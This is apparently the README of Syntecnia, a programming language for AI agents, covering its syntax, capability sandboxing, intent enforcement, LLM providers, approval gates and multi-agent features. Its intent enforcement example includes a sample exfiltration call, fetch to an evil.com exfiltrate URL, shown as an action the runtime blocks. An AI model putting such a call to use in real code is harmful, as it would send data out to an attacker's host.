# Syntecnia

A programming language designed for AI agents.

Syntecnia is not a framework or a library — it's a language where observability, security, multi-agent coordination, human interaction, and LLM integration are built-in primitives, not afterthoughts.

## Install

```bash
git clone https://github.com/kitecosmic/Syntecnia.git
cd Syntecnia
pip install -e .
```

Or without pip:

```bash
git clone https://github.com/kitecosmic/Syntecnia.git
cd Syntecnia
python3 -m syntecnia version
```

## Quick start

Create `hello.syn`:

```
let name be "World"
print("Hello, " + name + "!")

task greet(person)
    give "Welcome, " + person

print(greet("Alice"))
```

Run it:

```bash
syntecnia run hello.syn
```

## Usage

```bash
syntecnia run program.syn              # Run a program
syntecnia run program.syn -v           # Run with verbose output
syntecnia run program.syn --secure     # Run in secure mode (all capabilities must be granted)
syntecnia run program.syn --provider anthropic  # Use Claude as LLM engine
syntecnia run program.syn --grant net:api.example.com  # Grant a capability
syntecnia run program.syn --audit      # Show capability audit trail
syntecnia run program.fsyn             # Run flat (document-style) syntax
syntecnia repl                         # Interactive mode
syntecnia check program.syn            # Parse and validate without running
syntecnia tokens program.syn           # Show token stream
syntecnia ast program.syn              # Show abstract syntax tree
syntecnia testgen program.syn          # Auto-generate and run tests
```

## Language overview

### Variables and types

```
let name be "Alice"
let age be 30
let active be true
let items be [1, 2, 3]
let config be {"host": "localhost", "port": 8080}
```

### Tasks (functions)

```
task add(a, b)
    give a + b

task factorial(n)
    when n <= 1
        give 1
    otherwise
        give n * factorial(n - 1)
```

### Flow control

```
when score >= 90
    print("Excellent")
otherwise when score >= 70
    print("Good")
otherwise
    print("Keep trying")

each item in items
    print(item)

match status
    is "pending"
        process()
    is "done"
        archive()
```

### Custom types

```
type Customer
    name: text
    email: text
    balance: number

let c be Customer("Alice", "alice@example.com", 500)
print(name of c)
```

### Pipe operator

```
let result be data |> clean |> validate |> transform
```

### Intentional operations

Instead of loops, express what you want:

```
let expensive be where(products, is_expensive)
let names be collect(users, "name")
let doubled be apply(double, numbers)
let total be reduce(prices, add, 0)
let sorted be sort_by(products, get_price)
let groups be group_by(orders, get_status)
```

## Security

### Capabilities

Zero access by default. Declare what you need:

```
require net("api.example.com")
require file("/data/*")

let data be fetch("https://api.example.com/data")
let content be read_file("/data/report.csv")
```

### Intent enforcement

Declare what your program does. Actions outside the intent are blocked:

```
intent: "Read customer data from api.shop.com and generate reports"

-- This works (matches intent):
fetch("https://api.shop.com/customers")

-- This is BLOCKED (not in intent):
fetch("https://evil.com/exfiltrate")
```

The intent is frozen after declaration — prompt injection cannot expand it.

### Per-task capabilities

Tasks run in their own sandbox:

```
task fetch_orders()
    require net("api.shop.com")
    give fetch("https://api.shop.com/orders")

-- fetch_orders can ONLY access api.shop.com
-- even if the program has broader net capabilities
```

## LLM integration

The LLM is the reasoning engine, swappable like a database driver:

```
let analysis be analyze sales_data for "trends"
let action be decide between ["refund", "replace"] given complaint
let response be generate "email" given ticket with tone = "empathetic"
```

Configure the provider:

```bash
syntecnia run program.syn --provider anthropic   # Claude
syntecnia run program.syn --provider openai       # GPT
syntecnia run program.syn --provider ollama       # Local model
```

## Human interaction

Approval gates, questions, and confirmations are language primitives:

```
approve "Deploy to production?"
let choice be ask "Which environment?" with ["staging", "prod"]
confirm "Send email to 500 customers?"
show preview as "Email Preview"
```

## Multi-agent coordination

```
agent Researcher
    require net("*.wikipedia.org")
    task search(query)
        let data be fetch(query)
        share data as "research"

agent Writer
    observe "research" as data
    let report be generate "report" given data

spawn Researcher with query = "AI safety"
```

Agents coordinate via:
- **Blackboard**: shared state with versioning and watchers
- **Signals**: inter-agent messaging
- **Resource locks**: preventive conflict detection (not after-the-fact)

## Observability

```
trace "payment_processing"
    log "Processing order " + order_id
    measure "db_query"
        let result be query(sql)
    checkpoint "after_query"
```

### Rich error diagnostics

When something fails, you get:

```
ERROR: orders.syn:12:16: Division by zero

  Location: orders.syn:12:16
  Intent: Calculate order totals

  Source:
     >>   12 |     give total / units

  Variables at failure:
    order = {customer: Alice, quantity: 0, price: 100}

  Suggestions:
    1. Add a guard: when quantity != 0
    2. Add invariant: quantity > 0

  Category: data
  Recoverable: yes
```

### Automatic recovery

The runtime tries to recover before failing:
1. Retry with backoff (for IO errors)
2. Fallback to cached/default data
3. Partial results
4. Speculative alternatives
5. Human escalation with options and impact analysis

## Agent memory and rules

### Progress tracking

```
create_progress("sync", ["fetch", "validate", "update"])
start_step("sync", "fetch")
complete_step("sync", "fetch", "100 items")
-- If the agent crashes, resume_point("sync") returns where to continue
```

### Persistent memory

```
remember("preference", "Customer prefers formal tone", ["communication"])
remember("learning", "API is slow on Mondays", ["api"])
let prefs be recall("preference", ["communication"])
```

### Owner rules

```
add_rule("max_discount", "must", "discount <= 0.20", "pricing")
add_rule("formal_tone", "prefer", "Use formal tone", "communication")
let violations be check_rules("pricing", {"discount": 0.25})
```

Rule levels: `must` (hard block), `should` (warning), `avoid` (preference against), `prefer` (preference for).

## Flat syntax

For document-style readability, use `.fsyn` files:

```
task process_order(order):
    When amount of order > 1000, approve "Large order".
    Otherwise, log "Standard order".
    Then give "processed".
end
```

## Auto-generated tests

```bash
syntecnia testgen program.syn
```

Automatically generates edge-case tests from your types and task signatures:
- Zero, negative, empty string, empty list, nothing
- Type constructor arity checks
- Invariant verification
- Idempotency tests

## Tests

```bash
python3 tests/test_core.py          # 32 tests
python3 tests/test_capabilities.py  # 14 tests
python3 tests/test_agents.py        # 17 tests
python3 tests/test_intent.py        # 15 tests
python3 tests/test_advanced.py      # 40 tests
python3 tests/test_recovery.py      # 24 tests
python3 tests/test_agent_systems.py # 25 tests
```

167 tests total, 0 failures.

## Architecture

```
syntecnia/
├── core/              # Language foundation
│   ├── tokens.py      # Token definitions (60+ types)
│   ├── lexer.py       # Tokenizer with significant whitespace
│   ├── ast_nodes.py   # AST node definitions (40+ types)
│   ├── parser.py      # Recursive descent + Pratt parser
│   ├── interpreter.py # Tree-walking evaluator
│   ├── types.py       # Type system with origin tracking
│   ├── ast_api.py     # Structural AST manipulation
│   ├── testgen.py     # Automatic test generation
│   ├── intentional_ops.py  # apply/where/transform/reduce
│   ├── addressable.py # Token-efficient code access
│   └── flat_syntax.py # Document-style syntax translator
├── capabilities/      # Security layer
│   ├── model.py       # Capability types and sets
│   ├── enforcer.py    # Runtime enforcement
│   ├── builtins.py    # Secure I/O operations
│   └── intent.py      # Intent parsing and enforcement
├── runtime/           # Execution engine
│   ├── engine.py      # Top-level orchestrator
│   ├── speculative.py # Fork/rollback/commit execution
│   ├── error_reporter.py  # Rich error diagnostics
│   └── recovery.py    # Auto-recovery and escalation
├── agents/            # Multi-agent system
│   ├── blackboard.py  # Thread-safe shared state
│   ├── swarm.py       # Agent lifecycle and coordination
│   ├── resource_lock.py   # Preventive conflict detection
│   ├── progress.py    # Task progress tracking
│   ├── memory.py      # Persistent memory and rules
│   └── builtins.py    # Agent operation builtins
├── human/             # Human interaction
│   └── interaction.py # Terminal, auto, queue, callback handlers
├── llm/               # LLM integration
│   └── provider.py    # Anthropic, OpenAI, Ollama, Mock
└── cli.py             # Command-line interface
```

## Roadmap

- [ ] Port runtime to Rust (tokio async, real parallelism)
- [ ] Async I/O operations
- [ ] Database capability and query builder
- [ ] Web server capability (serve HTTP)
- [ ] Package manager for verified capabilities
- [ ] Language server protocol (LSP) for IDE support
- [ ] Visual dashboard for agent swarm monitoring

## License

MIT
